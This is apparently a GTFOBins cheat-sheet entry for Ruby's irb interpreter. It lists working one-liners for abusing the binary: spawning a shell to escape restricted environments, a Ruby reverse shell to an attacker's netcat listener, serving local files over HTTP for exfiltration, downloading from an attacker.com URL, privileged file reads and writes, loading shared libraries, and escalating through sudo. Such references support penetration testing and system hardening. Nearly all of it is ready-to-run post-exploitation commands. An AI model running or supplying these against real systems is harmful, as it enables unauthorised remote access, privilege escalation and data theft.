# GTFOBin: irb

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
irb
exec '/bin/bash'
```

## Reverse shell

It can send back a reverse shell to a listening attacker to open a remote network access.

Run `nc -l -p 12345` on the attacker box to receive the shell.

```
export RHOST='127.0.0.1'
export RPORT=9000
irb
require 'socket'; exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read} end
```

## File upload

It can exfiltrate files on the network.

Serve files in the local folder running an HTTP server on port 8888.

```
irb
require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;
```

## File download

It can download remote files.

Fetch a remote file via HTTP GET request.

```
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
irb
require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
irb
File.open("file_to_write", "w+") { |f| f.write("DATA") }
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
irb
puts File.read("file_to_read")
```

## Library load

It loads shared libraries that may be used to run code in the binary execution context.

```
irb
require "fiddle"; Fiddle.dlopen("lib.so")
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo irb
exec '/bin/bash'
```